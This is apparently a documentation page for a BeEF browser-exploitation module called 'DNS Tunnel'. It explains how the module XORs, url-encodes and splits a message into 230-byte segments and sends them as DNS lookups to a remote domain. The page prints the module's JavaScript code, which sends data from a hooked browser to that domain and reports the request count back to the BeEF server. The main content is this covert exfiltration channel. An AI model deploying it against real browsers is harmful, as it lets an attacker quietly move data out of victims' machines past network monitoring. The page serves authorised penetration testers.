## Summary

* **Objective**: Sends obfuscated data one way over DNS
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/ipec/dns_tunnel)

## Internal Working

A domain and message are taken as input. The message is XOR'd, url encoded, the '%' are replaced with '.' and the message is split into segments of 230 bytes. The segments are sent in sequence along with the sequence number and XOR key.

### Note ###

A remote domain with a DNS server configured to accept wildcard subdomains is required to receive the data. BeEF does not support this feature so you're on your own when it comes to decoding the information.

```js

var encode_data = function(str) {
    var result="";
    for(i=0;i<str.length;++i) {
        result+=str.charCodeAt(i).toString(16).toUpperCase();
    }
    return result;
};

        
var msgId   = "<%= @command_id %>";
var wait    = "<%= @wait %>";
var domain  = "<%= @domain %>";
var message = "<%= @message %>";

beef.net.dns.send(msgId, message, domain, wait, function(num) { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'dns_requests='+num+' requests sent') } );
```


## Feedback

